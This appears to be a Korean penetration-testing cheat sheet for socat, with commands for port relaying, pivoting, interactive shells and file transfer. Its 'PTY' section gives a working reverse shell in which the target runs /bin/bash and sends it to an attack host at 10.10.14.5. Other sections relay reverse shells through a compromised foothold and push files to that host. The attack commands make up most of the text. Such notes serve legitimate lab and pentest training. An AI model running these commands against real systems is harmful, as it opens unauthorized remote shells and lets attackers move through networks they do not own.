# socat으로 릴레이·파일 전송·PTY

- socat — 파일, TCP/UDP, PTY, EXEC 등 두 주소를 잇는 범용 릴레이 도구. TCP-LISTEN,fork,reuseaddr 조합으로 포트 중계·리버스 셸 릴레이·파일 전송을 처리한다.
- 리버스 셸을 공격 호스트로 직접 받지 못할 때 중간 발판에서 중계할 때, 바이너리·텍스트 파일을 네트워크로 옮길 때, PTY를 붙여 대화형 셸을 만들 때.
- Kali는 기본 설치(sudo apt install socat), Windows는 workspace\pivoting\socat\socat.exe 사용. 문법은 주소1 주소2를 나열하는 형태.

## 기본 명령어 구조

```bash
socat [옵션] 주소1 주소2
```

- 주소는 TCP-LISTEN:8000, TCP:호스트:포트, FILE:경로, EXEC:"명령" 등의 형식이고 콤마 뒤에 옵션이 붙는다.

## TCP 릴레이 (포트 중계)

```bash
# 8000으로 들어온 연결을 10.0.0.10:80으로 중계
socat TCP-LISTEN:8000,fork,reuseaddr TCP:10.0.0.10:80
```

- `TCP-LISTEN:8000`: 로컬 8000 리슨.
- `fork`: 연결마다 자식 프로세스를 만들어 다중 연결 처리.
- `reuseaddr`: TIME_WAIT 상태에서도 같은 포트 재바인딩 허용.

## 리버스 셸 릴레이

```bash
# 중간 발판: 9000으로 들어온 연결을 내부 10.0.0.10:4444로 전달
socat TCP-LISTEN:9000,fork,reuseaddr TCP:10.0.0.10:4444
```

- 발판에서 리버스 셸이 9000으로 나가면 공격 호스트 쪽 리스너로 릴레이된다.

## PTY로 대화형 셸

```bash
# 공격 호스트 (리스너 겸 PTY)
socat file:$(tty),raw,echo=0 TCP-LISTEN:4444

# 대상 (셸을 터널로 전송)
socat TCP:10.10.14.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

- pty,sane 조합으로 nc보다 탭 자동완성·방향키가 잘 동작하는 셸을 얻는다.

## 파일 전송

```bash
# 수신 측
socat -u TCP-LISTEN:9000,reuseaddr OPEN:received.bin,creat,trunc

# 송신 측
socat -u FILE:payload.bin TCP:10.10.14.5:9000
```

- `-u`: 단방향 전송. `creat,trunc`로 파일을 새로 만들어 기록한다.

## Windows 발판 예시

```powershell
workspace\pivoting\socat\socat.exe TCP-LISTEN:8000,fork,reuseaddr TCP:10.0.0.10:445
```

## 팁·트러블슈팅

1. fork를 빠뜨리면 첫 연결 후 릴레이가 죽는다. 다중 연결이면 반드시 붙인다.
2. 바이너리 전송이 깨지면 -u 단방향과 raw 모드를 확인한다(PTY 양방향 혼합은 CRLF 변환 주의).
3. 장기 실행은 nohup socat ... & 또는 tmux 세션에서 돌린다.
